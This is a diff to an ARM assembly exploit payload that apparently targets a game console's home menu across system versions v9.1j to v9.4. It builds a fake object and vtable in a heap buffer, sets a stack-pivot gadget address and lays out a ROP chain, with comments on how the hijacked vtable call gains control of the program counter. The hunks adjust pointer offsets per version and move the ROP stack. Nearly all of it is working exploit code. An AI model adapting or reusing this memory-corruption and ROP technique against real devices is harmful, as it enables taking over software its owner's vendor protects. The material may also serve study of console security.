@@ -15,8 +15,6 @@ L_2441a0: L_1e95e0(*(inr0+4)); ...
 L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
 */
 
-#define HEAPBUF 0x35052080
-
 #define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)
 
 #if SYSVER>=93 //v9.3-v9.4
@@ -120,10 +118,16 @@ object:
 .space ((object + 0x28) - .)
 .word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
-.space ((object + 0x2f0) - .)
+.space ((object + 0x2ec) - .)
+#if SYSVER > 92 //Dunno if this applies for versions other than v9.2.
+.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
+#endif
 .word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
 
 .space ((object + 0x3a60) - .)
+#if SYSVER <= 92 //Dunno if this applies for versions other than v9.2.
+.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
+#endif
 .word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
 
 vtable:
@@ -132,6 +136,8 @@ vtable:
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 
 .space ((vtable + 0x100) - .)
+
+.space ((_start + 0x4000) - .) @ Base the stack at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
 
 ropstackstart:
 .word POP_R1PC
